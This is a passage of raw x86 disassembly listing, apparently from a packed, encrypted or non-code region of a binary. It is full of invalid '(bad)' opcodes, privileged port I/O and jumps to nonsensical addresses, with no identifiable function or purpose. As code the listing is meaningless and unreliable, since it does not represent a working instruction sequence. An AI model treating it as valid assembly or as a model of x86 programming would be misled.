  4151d1:	and    edx,DWORD PTR [ebp+eiz*2+0x60f24942]
  4151d8:	pop    edi
  4151d9:	add    eax,0xb30213f7
  4151de:	(bad)  
  4151df:	shl    BYTE PTR [eax+0x1fb5d3fa],1
  4151e5:	inc    ebp
  4151e6:	repnz mov esi,0x1808250d
  4151ec:	mov    edx,ecx
  4151ee:	out    0x68,al
  4151f0:	cld    
  4151f1:	mov    dl,0x6a
  4151f3:	adc    dl,BYTE PTR [ebp-0x26a88fc2]
  4151f9:	push   edi
  4151fa:	(bad)  
  4151fb:	and    al,0xbc
  4151fd:	adc    DWORD PTR [edi+ebp*2-0x18df1465],esi
  415204:	pop    ebp
  415205:	jo     0x4151dc
  415207:	cmp    BYTE PTR [edi],0x6c
  41520a:	jnp    0x415254
  41520c:	jmp    0xd5e3395
  415211:	std    
  415212:	sub    ebp,0x55774ed2
  415218:	pop    edx
  415219:	jae    0x4151a0
  41521b:	ret    
  41521c:	enter  0x2e16,0x7a
  415220:	lds    edx,FWORD PTR [ecx+0x17]
  415223:	dec    eax
  415224:	sub    bh,BYTE PTR [esi]
  415226:	push   ebx
  415227:	jmp    0x990af09d
  41522c:	add    BYTE PTR [esp+edx*1+0x66],0x77
  415231:	sbb    BYTE PTR [eax-0x7],al
  415234:	push   esi
  415235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415236:	ja     0x415211
  415238:	sbb    DWORD PTR [ebx],ebx
  41523a:	mov    ah,0x3a
  41523c:	outs   dx,DWORD PTR ds:[esi]
  41523d:	loop   0x41529a
  41523f:	mov    ebx,0x29d642b1
  415244:	dec    eax
  415245:	gs sub ebp,ebp
  415248:	pusha  
  415249:	xchg   DWORD PTR [esi],ecx
  41524b:	sub    eax,0x58cf7b
  415250:	sbb    DWORD PTR [edx-0x28],ecx
  415253:	mov    bl,BYTE PTR [ecx+0x1f]
  415256:	pop    ebx
  415257:	mov    ecx,0xda32b203
  41525c:	cmp    bh,BYTE PTR [esi+0x68]
  41525f:	adc    eax,0x370a6c70
  415264:	dec    esi
  415265:	pop    esi
  415266:	scas   eax,DWORD PTR es:[edi]
  415267:	loop   0x4152c0
  415269:	cmp    BYTE PTR [edi+0x145df596],ch
  41526f:	out    0x92,al
  415271:	jne    0x4152aa
  415273:	cmp    eax,0x7d1b13c6
  415278:	leave  
  415279:	inc    eax
  41527a:	mov    eax,0x7603a7e7
  41527f:	xchg   esp,eax
  415280:	test   al,0xf3
  415282:	in     al,0x6b
  415284:	stc    
  415285:	out    dx,eax
  415286:	add    ecx,DWORD PTR [edx-0x4f]
  415289:	cmc    
  41528a:	lods   eax,DWORD PTR ds:[esi]
  41528b:	xor    al,dl
  41528d:	ret    
  41528e:	inc    ecx
  41528f:	sub    eax,0x68e7f2a1
  415294:	push   ecx
  415295:	pop    ds
  415296:	xchg   esi,eax
  415297:	or     DWORD PTR [esp+eiz*4],0xb4f6fe1f
  41529e:	not    BYTE PTR [ecx]
  4152a0:	sbb    bl,dl
  4152a2:	pusha  
  4152a3:	aam    0x31
  4152a5:	dec    ecx
  4152a6:	(bad)  
  4152a7:	ins    DWORD PTR es:[edi],dx
  4152a8:	adc    eax,0xa2621eb4
  4152ad:	cmp    BYTE PTR [ecx*8+0x6fe26667],bl
  4152b4:	xchg   BYTE PTR [edx-0x4317e69],al
  4152ba:	and    ebx,DWORD PTR [ecx]
  4152bc:	add    DWORD PTR [ebp+0x206479d2],eax
  4152c2:	cmp    eax,esp
  4152c4:	xchg   ebx,eax
  4152c5:	pop    es
  4152c6:	mov    bl,BYTE PTR [esi]
  4152c8:	mov    ecx,0x8b7d8269
  4152cd:	mov    dh,0x5d
  4152cf:	pop    edi
  4152d0:	pop    ebx
  4152d1:	pop    edx
  4152d2:	xchg   edi,eax
  4152d3:	rcl    DWORD PTR [ebx-0x4],cl
  4152d6:	js     0x415342
  4152d8:	sbb    DWORD PTR [esi*8+0x5b0623bb],esp
  4152df:	or     esi,DWORD PTR [esi-0x73]
  4152e2:	js     0x4152c6
  4152e4:	xchg   BYTE PTR [edx+ebx*4],al
  4152e7:	sbb    BYTE PTR [edi+0x7b],ah
  4152ea:	ds cmp eax,0x84cddb62
  4152f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152f1:	mov    dl,0x81
  4152f3:	jno    0x4152a6
  4152f5:	mov    ah,0x79
  4152f7:	mov    esp,eax
  4152f9:	add    al,0xf5
  4152fb:	sbb    ebx,ecx
  4152fd:	stos   DWORD PTR es:[edi],eax
  4152fe:	and    DWORD PTR [ecx+0x31],edi
  415301:	inc    esi
  415302:	mov    ch,0x59
  415304:	out    dx,al
  415305:	outs   dx,DWORD PTR ds:[esi]
  415306:	mov    BYTE PTR [edx+0x12446fea],0xa9
  41530d:	neg    DWORD PTR [ecx+0x3243b822]
  415313:	jne    0x415302
  415315:	xchg   BYTE PTR [ecx-0x44],dl
  415318:	aad    0xb7
  41531a:	in     eax,dx
  41531b:	add    al,0xeb
  41531d:	iret   
  41531e:	mov    al,ds:0x2944c6bb
  415323:	(bad)  
  415324:	lahf   
  415325:	mov    edi,0x6ba1be62
  41532a:	inc    ebx
  41532b:	ror    DWORD PTR [esi+ebp*1+0x76],0xe1
  415330:	lahf   
  415331:	pop    edx
  415332:	fild   DWORD PTR [edx]
  415334:	add    DWORD PTR [esi-0x5d],ebx
  415337:	lahf   
  415338:	out    dx,al
  415339:	xor    eax,eax
  41533b:	lods   al,BYTE PTR ds:[esi]
  41533c:	pop    edx
  41533d:	push   ecx
  41533e:	jo     0x4153bd
  415340:	mov    ds:0xa3ff073e,al
  415345:	add    eax,0x59de08df
  41534a:	addr16 pop edi
  41534c:	out    dx,eax
  41534d:	test   eax,0x5ec1e44d
  415352:	pop    edi
  415353:	call   0xa058f646
  415358:	mov    dh,0xa
  41535a:	jg     0x4153ba
  41535c:	aad    0x1d
  41535e:	fs repz jno 0x41539a
  415362:	stos   BYTE PTR es:[edi],al
  415363:	mov    eax,0x2a7edbeb
  415368:	js     0x415349
  41536a:	ret    0x996b
  41536d:	xor    ebx,DWORD PTR [ecx]
  41536f:	mov    ebx,0xe12a00df
  415374:	mov    ch,bh
  415376:	sbb    al,0x65
  415378:	sti    
  415379:	stos   BYTE PTR es:[edi],al
  41537a:	mov    es,WORD PTR [ebp+0x41]
  41537d:	jae    0x41535a
  41537f:	and    ch,ch
  415381:	sub    BYTE PTR [eax-0x48],dh
  415384:	imul   esp,esp,0xc4e21a7f
  41538a:	aaa    
  41538b:	loope  0x415328
  41538d:	pusha  
  41538e:	or     DWORD PTR [ebp+0x2682dd85],esp
  415394:	aaa    
  415395:	scas   al,BYTE PTR es:[edi]
  415396:	repnz cld 
  415398:	cwde   
  415399:	push   es
  41539a:	inc    ebx
  41539b:	sub    al,0x30
  41539d:	inc    esi
  41539e:	xchg   ebp,eax
  41539f:	out    0x2,eax
  4153a1:	pusha  
  4153a2:	jbe    0x4153ad
  4153a4:	fdiv   st(5),st
  4153a6:	dec    ebx
  4153a7:	outs   dx,DWORD PTR ds:[esi]
  4153a8:	icebp  
  4153a9:	cld    
  4153aa:	arpl   cx,bx
  4153ac:	pop    ds
  4153ad:	add    BYTE PTR [eax],cl
  4153af:	jne    0x41533f
  4153b1:	dec    esp
  4153b2:	xchg   esp,eax
  4153b3:	mov    cl,0x7e
  4153b5:	test   eax,0x577e7acc
  4153ba:	test   eax,0xaee43383
  4153bf:	xchg   esi,eax
  4153c0:	mov    esi,0xe7e0ac17
  4153c5:	xor    cl,BYTE PTR [edi-0x307249d2]
  4153cb:	retf   0xbcbe
  4153ce:	jns    0x4153ad
  4153d0:	push   es
  4153d1:	mov    esi,0x56b7ae8f
  4153d6:	gs xchg edi,eax
  4153d8:	push   eax
  4153d9:	bound  ebp,QWORD PTR [eax]
  4153db:	cmc    
  4153dc:	xor    ebp,DWORD PTR [eax-0x149761f3]
  4153e2:	push   0x209bcd19
  4153e7:	mov    eax,0xd9a0e86a
  4153ec:	add    cl,BYTE PTR [edx-0x50d1a634]
  4153f2:	pop    edi
  4153f3:	sub    eax,0x28aaecbc
  4153f8:	ror    DWORD PTR [ecx+0x30],cl
  4153fb:	cmp    eax,0x1f1efc36
  415400:	sub    ebx,ebp
  415402:	jecxz  0x41543c
  415404:	inc    ebp
  415405:	stc    
  415406:	inc    ebp
  415407:	adc    al,0x2e
  415409:	(bad)  
  41540b:	jne    0x41538e
  41540d:	pop    esp
  41540e:	xor    eax,0x8923f1a1
  415413:	xlat   BYTE PTR ds:[ebx]
  415414:	and    eax,0xba18f619
  415419:	jecxz  0x415456
  41541b:	imul   esi,DWORD PTR [ecx-0x774d7ab],0x5b9d3abb
  415425:	shl    DWORD PTR [edx+ecx*4],0xfa
  415429:	dec    ecx
  41542a:	jecxz  0x415449
  41542c:	ss ret 0x2263
  415430:	fs stos BYTE PTR es:[edi],al
  415432:	jns    0x4153c3
  415434:	mov    esi,0xd602bd54
  415439:	mov    ebp,0x62456ee5
  41543e:	in     al,0x6d
  415440:	lock push ecx
  415442:	mov    es:0x166dba37,eax
  415448:	not    BYTE PTR [ecx]
  41544a:	mov    ebx,DWORD PTR [ebx]
  41544c:	add    esp,DWORD PTR [edi+0x7ded67e6]
  415452:	mov    esi,0x5e08e0a1
  415457:	into   
  415458:	aaa    
  415459:	sbb    dl,BYTE PTR [eax+0x59]
  41545c:	lea    esi,[bx+di]
  41545f:	daa    
  415460:	inc    ecx
  415461:	pop    ebx
  415462:	pop    ecx
  415463:	dec    esp
  415464:	push   edx
  415465:	push   ss
  415466:	jnp    0x41544d
  415468:	push   edx
  415469:	repz out dx,al
  41546b:	cwde   
  41546c:	(bad)  
  41546d:	jae    0x415408
  41546f:	jecxz  0x415411
  415471:	ficomp WORD PTR [edi+ebx*4-0x672e6fdb]
  415478:	out    0xb8,al
  41547a:	js     0x41543f
  41547c:	mov    al,0x42
  41547e:	inc    ecx
  41547f:	cdq    
  415480:	push   ds
  415481:	push   eax
  415482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415483:	jbe    0x415464
  415485:	cmp    eax,0x81365434
  41548a:	pop    edi
  41548b:	pop    eax
  41548c:	pop    esp
  41548d:	pop    esp
  41548e:	mov    WORD PTR [esp+edi*8-0x6ef48540],?
  415495:	pusha  
  415496:	xor    al,0xc9
  415498:	lods   eax,DWORD PTR ds:[esi]
  415499:	loop   0x415439
  41549b:	mov    dl,0x82
  41549d:	mov    ah,0xe6
  41549f:	cmp    al,0xe9
  4154a1:	xchg   BYTE PTR [edx],ch
  4154a3:	xchg   esi,eax
  4154a4:	iret   
  4154a5:	xchg   edx,eax
  4154a6:	jae    0x415489
  4154a8:	pop    ds
  4154a9:	gs pop es
  4154ab:	inc    esp
  4154ac:	shl    BYTE PTR [esi],1
  4154ae:	leave  
  4154af:	and    dl,BYTE PTR [edi]
  4154b1:	pusha  
  4154b2:	cmp    eax,0xae4ad4ed
  4154b7:	pop    esi
  4154b8:	xchg   ebx,eax
  4154b9:	mov    ebx,0x7146b97c
  4154be:	cmc    
  4154bf:	clc    
  4154c0:	mov    al,0x37
  4154c2:	sub    esp,DWORD PTR [ecx]
  4154c4:	sbb    eax,0x84bd28d3
  4154c9:	jne    0x41551b
  4154cb:	mov    edx,esi
  4154cd:	in     al,0x6a
  4154cf:	sar    edi,0xc4
  4154d2:	and    esi,DWORD PTR [bx+si-0x33]
  4154d6:	push   cs
  4154d7:	jno    0x4154cb
  4154d9:	sahf   
  4154da:	pop    ds
  4154db:	aad    0x7c
  4154dd:	inc    ecx
  4154de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154df:	cmp    BYTE PTR [eax],0x3b
  4154e2:	sub    BYTE PTR [esi+ecx*8+0x17],ch
  4154e6:	jnp    0x41551d
  4154e8:	mov    esi,DWORD PTR ds:0x93f32170
  4154ee:	push   0x78
  4154f0:	inc    ebp
  4154f1:	lahf   
  4154f2:	cmp    ah,ah
  4154f4:	test   dl,ah
  4154f6:	sub    DWORD PTR [ebp-0x2c7a401d],esi
  4154fc:	add    BYTE PTR [esi],cl
  4154fe:	jg     0x4154a3
  415500:	jne    0x4154b7
  415502:	(bad)  
  415503:	adc    eax,0xd45b7233
  415508:	adc    dh,BYTE PTR [edx]
  41550a:	gs mov esp,0x1699f017
  415510:	mov    eax,0x83b75396
  415515:	inc    ebx
  415516:	jnp    0x415559
  415518:	lods   al,BYTE PTR ds:[esi]
  415519:	mov    dh,0x95
  41551b:	xchg   edx,eax
  41551c:	or     DWORD PTR [edi-0x6f],edi
  41551f:	inc    esp
  415520:	stos   BYTE PTR es:[edi],al
  415521:	mov    ch,0x91
  415523:	scas   al,BYTE PTR es:[edi]
  415524:	repz les esp,FWORD PTR [eax+0x4d897063]
  41552b:	xchg   ebp,eax
  41552c:	cli    
  41552d:	inc    ebp
  41552e:	loope  0x415577
  415530:	or     DWORD PTR ds:[edx-0x61cd7301],ebp
  415537:	xor    esp,DWORD PTR [ecx]
  415539:	inc    ebp
  41553a:	xor    al,0xd6
  41553c:	pop    DWORD PTR [edi]
  41553e:	xchg   edi,eax
  41553f:	inc    edx
  415540:	and    BYTE PTR [esi-0x32afbb4c],bh
  415546:	stos   BYTE PTR es:[edi],al
  415547:	out    dx,al
  415548:	push   ecx
  415549:	mov    ss,WORD PTR [ebx]
  41554b:	dec    esp
  41554c:	mov    DWORD PTR [ecx-0x6],0x27e17138
  415553:	std    
  415554:	xlat   BYTE PTR ds:[ebx]
  415555:	call   DWORD PTR [ecx-0xd422898]
  41555b:	pop    ss
  41555c:	push   esp
  41555d:	ret    0xefaa
  415560:	jp     0x415561
  415562:	jecxz  0x4155b1
  415564:	add    dh,al
  415566:	push   0x5d
  415568:	adc    cl,BYTE PTR [ebp+0xb77fce1]
  41556e:	inc    esp
  41556f:	pop    eax
  415570:	pop    ebx
  415571:	adc    bh,BYTE PTR [edi]
  415573:	or     ah,BYTE PTR [ecx]
  415575:	lahf   
  415576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415577:	(bad)  
  415578:	(bad)  
  415579:	mov    DWORD PTR [eax],ebx
  41557b:	lahf   
  41557c:	daa    
  41557d:	leave  
  41557e:	and    bl,BYTE PTR [ebp-0x37]
  415581:	rcl    DWORD PTR [esi-0x3b5f45b],1
  415587:	mov    dl,0xd0
  415589:	push   edi
  41558a:	sbb    esp,DWORD PTR [edx]
  41558c:	add    ebx,edi
  41558e:	pop    ecx
  41558f:	std    
  415590:	aas    
  415591:	fidiv  DWORD PTR [ebx]
  415593:	xor    ecx,ebp
  415595:	cmp    esi,DWORD PTR [eax]
  415597:	test   bh,dh
  415599:	inc    esp
  41559a:	adc    cl,BYTE PTR [edi-0x4eb9c527]
  4155a0:	leave  
  4155a1:	pop    edi
  4155a2:	cmp    edi,DWORD PTR [ebp-0x63]
  4155a5:	xor    bp,0xe713
  4155aa:	mov    ds:0x89d0fefb,al
  4155af:	mov    eax,esp
  4155b1:	xchg   esi,eax
  4155b2:	sub    eax,0xced1d955
  4155b7:	fisttp WORD PTR [edi+0x0]
  4155ba:	ja     0x415542
  4155bc:	ret    
  4155bd:	and    ah,BYTE PTR [eax]
  4155bf:	mov    ecx,0x4b133dab
  4155c4:	or     BYTE PTR ds:0xcc058344,dh
  4155ca:	jl     0x415636
  4155cc:	je     0x4155dd
  4155ce:	(bad)  
  4155cf:	pop    ebx
  4155d0:	jl     0x4155ed
  4155d2:	inc    ecx
  4155d3:	sbb    BYTE PTR [ebp-0x1e],bh
  4155d6:	lds    esp,FWORD PTR [ecx]
  4155d8:	inc    edx
  4155d9:	ja     0x4155dd
  4155db:	xor    DWORD PTR [edx-0x445ddaca],ebx
  4155e1:	mov    ds:0x2048cf1c,al
  4155e6:	pusha  
  4155e7:	int3   
  4155e8:	test   eax,0xd122b06e
  4155ed:	sbb    eax,0x2a215992
  4155f2:	xor    ebx,esi
  4155f4:	pop    es
  4155f5:	or     edx,DWORD PTR [eax]
  4155f7:	and    al,0x1a
  4155f9:	xchg   esp,eax
  4155fa:	das    
  4155fb:	sbb    ch,dh
  4155fd:	popa   
  4155fe:	xchg   BYTE PTR [eax-0x73944f2b],bl
  415604:	js     0x415588
  415606:	cmp    BYTE PTR [ecx+esi*1-0x71],cl
  41560a:	(bad)  
  41560c:	dec    edx
  41560d:	jmp    0x3a43:0xce81c2f7
  415614:	dec    esp
  415615:	ins    DWORD PTR es:[edi],dx
  415616:	(bad)  
  415617:	ja     0x41568b
  415619:	scas   al,BYTE PTR es:[edi]
  41561a:	aam    0x89
  41561c:	pop    edx
  41561d:	push   ds
  41561e:	xor    eax,ecx
  415620:	jnp    0x4155e1
  415622:	(bad)  
  415623:	xchg   esi,eax
  415624:	sbb    DWORD PTR [eax],ecx
  415626:	dec    edi
  415627:	ror    DWORD PTR [ebp+0x5f],1
  41562a:	jge    0x415696
  41562c:	mov    al,0xab
  41562e:	fcmovnbe st,st(2)
  415630:	mul    DWORD PTR [edx+0x38]
  415633:	mov    bl,0x72
  415635:	adc    eax,0x35e32e34
  41563a:	xchg   esp,eax
  41563b:	out    dx,al
  41563c:	outs   dx,BYTE PTR ds:[esi]
  41563d:	push   edi
  41563e:	aas    
  41563f:	cmp    eax,0x7bed57c
  415644:	std    
  415645:	xchg   DWORD PTR [ebx-0x62],esp
  415648:	cs dec ebx
  41564a:	xor    ah,BYTE PTR ds:0x94ab676c
  415650:	push   esp
  415651:	test   DWORD PTR [esi],edi
  415653:	inc    eax
  415654:	sbb    BYTE PTR [eax+0x1e5fec06],ah
  41565a:	push   esi
  41565b:	sbb    edx,edx
  41565d:	or     al,0xd4
  41565f:	adc    eax,esi
  415661:	rol    BYTE PTR [esi],0x69
  415664:	xchg   ebx,eax
  415665:	je     0x4156cc
  415667:	xchg   ecx,eax
  415668:	add    cl,BYTE PTR [esi+0x0]
  41566b:	loopne 0x4155fd
  41566d:	inc    ecx
  41566e:	shr    DWORD PTR [eax-0xfbd7f5],cl
  415674:	fsubr  DWORD PTR [esi+0x58]
  415677:	sbb    eax,0x3a10aee1
  41567c:	iret   
  41567d:	addr16 pop edx
  41567f:	jo     0x415698
  415681:	adc    BYTE PTR [edi+0x33f8183f],0xad
  415688:	cmp    al,0xbb
  41568a:	arpl   WORD PTR [eax-0xd],cx
  41568d:	in     al,dx
  41568e:	cmp    dl,dh
  415690:	aaa    
  415691:	or     ebx,esp
  415693:	cmp    bh,dl
  415695:	adc    edi,ebx
  415697:	in     al,0xfe
  415699:	adc    BYTE PTR [eax+0x5baf5df3],dl
  41569f:	push   eax
  4156a0:	ret    0x2b27
  4156a3:	aaa    
  4156a4:	adc    BYTE PTR [ebx],al
  4156a6:	in     eax,0xa5
  4156a8:	push   ds
  4156a9:	outs   dx,DWORD PTR ds:[esi]
  4156aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156ab:	daa    
  4156ac:	xchg   ebp,eax
  4156ad:	xchg   esi,eax
  4156ae:	jg     0x41571d
  4156b0:	fwait
  4156b1:	inc    edi
  4156b2:	rcl    BYTE PTR ds:0xc724aa72,cl
  4156b8:	jbe    0x4156bb
  4156ba:	mov    eax,ds:0xb6b757a8
  4156bf:	push   0x5d
  4156c1:	shr    BYTE PTR ds:0xa33b5e25,1
  4156c7:	xchg   esp,eax
  4156c8:	xchg   esi,eax
  4156c9:	ficomp DWORD PTR [ebp+0x7907de36]
  4156cf:	fwait
  4156d0:	jo     0x415699
  4156d2:	addr16 pushf 
  4156d4:	pop    ebp
  4156d5:	pop    esp
  4156d6:	add    BYTE PTR [edx-0x18],ch
  4156d9:	fdivp  st(7),st
  4156db:	fptan  
  4156dd:	and    eax,0x1ddff7c7
  4156e2:	ja     0x41570a
  4156e4:	jo     0x4156d0
  4156e6:	aam    0x35
  4156e8:	xor    eax,ebp
  4156ea:	test   DWORD PTR [edi-0x28],esp
  4156ed:	or     eax,0x87865ad2
  4156f2:	mov    edx,0x68a79c64
  4156f7:	adc    edi,0x1
  4156fa:	pop    es
  4156fb:	fdivr  DWORD PTR [ebp+ecx*4+0xe]
  4156ff:	add    BYTE PTR [ebp-0x7da7571f],cl
  415705:	pop    ebp
  415706:	jbe    0x415702
  415708:	dec    esp
  415709:	push   ebp
  41570a:	mov    al,ds:0x91ae6608
  41570f:	sbb    al,0xe9
  415711:	dec    ebx
  415712:	inc    eax
  415713:	popf   
  415714:	mov    dh,0x64
  415716:	sub    eax,DWORD PTR [ecx-0x145e380a]
  41571c:	xchg   ecx,eax
  41571d:	mov    cl,BYTE PTR [ebx-0x3c]
  415720:	sub    eax,0xd021340c
  415725:	cmp    ebp,ecx
  415727:	jecxz  0x4156c4
  415729:	cmp    eax,0xba23c334
  41572e:	lods   eax,DWORD PTR ds:[esi]
  41572f:	mov    dh,0x33
  415731:	jmp    DWORD PTR [esi]
  415733:	mov    ah,0x76
  415735:	mov    dh,0xe1
  415737:	xchg   BYTE PTR [ecx-0x6d],cl
  41573a:	outs   dx,BYTE PTR ds:[esi]
  41573c:	mov    al,ds:0xc3c4c95e
  415741:	or     BYTE PTR [edx],bh
  415743:	jg     0x4156d2
  415745:	inc    eax
  415746:	xchg   cl,dh
  415748:	(bad)  
  415749:	fdivr  DWORD PTR [esi]
  41574b:	jl     0x415745
  41574d:	xchg   esp,eax
  41574e:	push   cs
  41574f:	xchg   ebp,eax
  415750:	jbe    0x4157af
  415752:	jg     0x4157b9
  415754:	stc    
  415755:	ins    BYTE PTR es:[edi],dx
  415756:	sub    DWORD PTR [ecx+0x1b2194ba],edi
  41575c:	test   al,0xd5
  41575e:	mov    cl,0x70
  415760:	jnp    0x415707
  415762:	ins    DWORD PTR es:[edi],dx
  415763:	shl    BYTE PTR [ebx+0x1a90302d],0xe7
  41576a:	or     eax,DWORD PTR [edi-0x70]
  41576d:	jo     0x3e3eb67f
  415773:	je     0x4157dc
  415775:	outs   dx,BYTE PTR fs:[esi]
  415777:	jbe    0x4157a1
  415779:	cld    
  41577a:	inc    edx
  41577b:	mov    DWORD PTR [edx+0x14c7e187],esp
  415781:	sahf   
  415782:	mov    WORD PTR [edi-0xd0f1e3c],cs
  415788:	adc    eax,0xcf97ff1b
  41578d:	add    ebp,esp
  41578f:	dec    edi
  415790:	xchg   BYTE PTR [edi-0xe],ch
  415793:	cmp    edx,DWORD PTR [ebx]
  415795:	rol    ebx,cl
  415797:	hlt    
  415798:	cwde   
  415799:	mov    cl,0xbc
  41579b:	xchg   DWORD PTR [ecx-0x74],eax
  41579e:	inc    eax
  41579f:	aaa    
  4157a0:	arpl   WORD PTR [ecx+0x31359378],ax
  4157a6:	xor    eax,0x5ad43cba
  4157ab:	stc    
  4157ac:	adc    al,0x8b
  4157ae:	push   ebx
  4157af:	add    al,BYTE PTR [eax-0x7dd8f408]
  4157b5:	dec    BYTE PTR [esi]
  4157b7:	repz std 
  4157b9:	out    dx,al
  4157ba:	xchg   ebx,eax
  4157bb:	aas    
  4157bc:	cdq    
  4157bd:	int    0x5a
  4157bf:	cmp    DWORD PTR [ebp+0x2c],esi
  4157c2:	mov    ebx,0xde316dda
  4157c7:	idiv   BYTE PTR ds:0xf80a5398
  4157cd:	pop    esi
  4157ce:	add    DWORD PTR [esi+0x3],edi
  4157d1:	push   DWORD PTR [ebx+edi*8-0x54]
  4157d5:	jnp    0x4157bb
  4157d7:	in     eax,0xae
  4157d9:	ret    
  4157da:	lahf   
  4157db:	cmp    eax,0x59330a21
  4157e0:	jge    0x41583a
  4157e2:	sub    BYTE PTR [edx+ecx*2],0xfd
  4157e6:	jl     0x41576a
  4157e8:	in     eax,0xef
  4157ea:	fsub   st,st(4)
  4157ec:	mov    edi,0xe6c45e42
  4157f1:	test   al,0x4d
  4157f3:	pushf  
  4157f4:	jbe    0x41578f
  4157f6:	stos   DWORD PTR es:[edi],eax
  4157f7:	xchg   ecx,eax
  4157f8:	test   eax,0xe92adab6
  4157fd:	cld    
  4157fe:	mov    dh,0x6f
  415800:	sub    BYTE PTR [ebx+0x58eab391],dh
  415806:	mov    edx,0x5906d6c
  41580b:	in     eax,dx
  41580c:	in     al,dx
  41580d:	lods   al,BYTE PTR ds:[esi]
  41580e:	idiv   DWORD PTR [eax-0x2e]
  415811:	dec    esi
  415812:	out    dx,al
  415813:	add    eax,0x14e713ec
  415818:	xor    edx,DWORD PTR [ebp+0x1d]
  41581b:	(bad)  
  41581c:	jmp    0xc331c23b
  415821:	sbb    al,0x5c
  415823:	xchg   BYTE PTR [eax+0x15338759],ch
  415829:	and    ch,BYTE PTR [edi]
  41582b:	pop    ebp
  41582c:	add    al,0x23
  41582e:	fwait
  41582f:	sbb    eax,0x94d19a4d
  415834:	mov    ds:0x5bf729a3,al
  415839:	jmp    0x48945376
  41583e:	daa    
  41583f:	or     ah,cl
  415841:	sbb    BYTE PTR [esp+eiz*2],0xb2
  415845:	popa   
  415846:	rol    ecx,0xab
  415849:	shl    edx,cl
  41584b:	push   ds
  41584c:	fcomip st,st(3)
  41584e:	mov    BYTE PTR [ebx+0x7a],ch
  415851:	mov    WORD PTR [ebx-0x528fb5df],?
  415857:	lods   al,BYTE PTR ds:[esi]
  415858:	mov    ecx,0x34f237e6
  41585d:	dec    eax
  41585e:	pop    ebp
  41585f:	scas   eax,DWORD PTR es:[edi]
  415860:	jb     0x41581e
  415862:	jo     0x41580b
  415864:	cmp    eax,DWORD PTR [eax+ebp*1-0x382ea6bc]
  41586b:	xor    DWORD PTR [esi+ebp*2],0xcc04e1e1
  415872:	arpl   WORD PTR [ecx],bx
  415874:	cmp    al,al
  415876:	in     al,0xff
  415878:	inc    ecx
  415879:	(bad)  
  41587a:	imul   ecx,DWORD PTR [ecx+0x5b],0xffffffe7
  41587e:	adc    al,0x73
  415880:	dec    eax
  415881:	push   cs
  415882:	add    BYTE PTR [esi+ebx*8],bh
  415885:	loopne 0x415885
  415887:	ja     0x4158c6
  415889:	and    BYTE PTR [eax],bl
  41588b:	out    dx,al
  41588c:	pop    ecx
  41588d:	stc    
  41588e:	xchg   edi,eax
  41588f:	sbb    eax,DWORD PTR ds:0xf0e17ed5
  415895:	ins    BYTE PTR es:[edi],dx
  415896:	iret   
  415897:	inc    esi
  415898:	jns    0x4158e3
  41589a:	ds mov al,0xa
  41589d:	scas   eax,DWORD PTR es:[edi]
  41589e:	mov    eax,edi
  4158a0:	or     ebp,eax
  4158a2:	cli    
  4158a3:	sub    BYTE PTR [eax-0x3b2eda61],cl
  4158a9:	or     al,0x68
  4158ab:	shl    BYTE PTR [ecx+0x31],0x80
  4158af:	add    ecx,DWORD PTR [ecx+0x48b7b592]
  4158b5:	jnp    0x834ae465
  4158bb:	jae    0x4158b9
  4158bd:	push   ds
  4158be:	or     al,0xe7
  4158c0:	adc    eax,0xb3e7dfc8
  4158c5:	and    eax,0xa7774090
  4158ca:	xchg   edi,eax
  4158cb:	and    BYTE PTR gs:[ebx-0x2074aeed],dl
  4158d2:	stos   BYTE PTR es:[edi],al
  4158d3:	inc    edx
  4158d4:	sahf   
  4158d5:	jae    0x415917
  4158d7:	gs dec edi
  4158d9:	xchg   ebp,eax
  4158da:	and    cl,ch
  4158dc:	cld    
  4158dd:	loope  0x4158f6
  4158df:	dec    esi
  4158e0:	xchg   edi,eax
  4158e1:	and    esp,eax
  4158e3:	pop    edi
  4158e4:	loopne 0x4158cb
  4158e6:	das    
  4158e7:	push   cs
  4158e8:	sbb    DWORD PTR [esi-0x41],0xdf3b0d24
  4158ef:	jne    0x415888
  4158f1:	mov    DWORD PTR [edi-0x69],ebx
  4158f4:	adc    al,0x6c
  4158f6:	loopne 0x415929
  4158f8:	gs je  0x415928
  4158fb:	xor    al,0x3c
  4158fd:	jge    0x41595a
  4158ff:	or     al,0xdf
  415901:	loope  0x4158f7
  415903:	ds jp  0x415912
  415906:	inc    esi
  415907:	xchg   edx,eax
  415908:	mov    al,0x3b
  41590a:	sbb    BYTE PTR [ecx+eax*8],al
  41590d:	test   DWORD PTR [edi],ebx
  41590f:	cmp    dl,BYTE PTR [eax]
  415911:	jl     0x4158e5
  415913:	sbb    ebx,DWORD PTR [ecx+0x2b199117]
  415919:	xchg   DWORD PTR [eax+0x48],eax
  41591c:	mov    ch,0xad
  41591e:	inc    edx
  41591f:	les    edx,FWORD PTR [ebp-0x662e51e9]
  415925:	xor    al,0x5c
  415927:	mov    cl,0x98
  415929:	je     0x4158f8
  41592b:	xchg   ah,al
  41592d:	xchg   ebx,eax
  41592e:	inc    esi
  41592f:	mov    ebp,0xc81c5afd
  415934:	sub    esp,DWORD PTR [edx+0x2e]
  415937:	inc    esp
  415938:	push   0xffffffdd
  41593a:	push   ss
  41593b:	dec    ebp
  41593c:	mov    dl,0xf3
  41593e:	not    DWORD PTR [ecx+0x3]
  415941:	cmp    BYTE PTR [ecx-0x1d],cl
  415944:	jno    0x4158d9
  415946:	sub    al,BYTE PTR [ebx+0x46]
  415949:	sbb    al,0xb2
  41594b:	pop    ebp
  41594c:	cmp    eax,0xa48e1886
  415951:	and    ebp,ebp
  415953:	icebp  
  415954:	mov    bl,0x2e
  415956:	(bad)  
  415957:	jl     0x415900
  415959:	xor    eax,0x2a0c6104
  41595e:	mov    edx,0xdb8be6ac
  415963:	pop    ds
  415964:	mov    esp,0xc49ea270
  415969:	nop
  41596a:	pop    eax
  41596b:	arpl   bp,sp
  41596d:	enter  0x7056,0xb
  415971:	imul   DWORD PTR [esi+0x55]
  415974:	sub    al,0x97
  415976:	sbb    al,BYTE PTR [edi]
  415978:	or     BYTE PTR [edi+0x27],bl
  41597b:	adc    bh,BYTE PTR [edi]
  41597d:	xor    BYTE PTR [ebp+edx*8-0x5d],dl
  415981:	push   0xffffff80
  415983:	inc    ebx
  415984:	dec    edi
  415985:	je     0x41599f
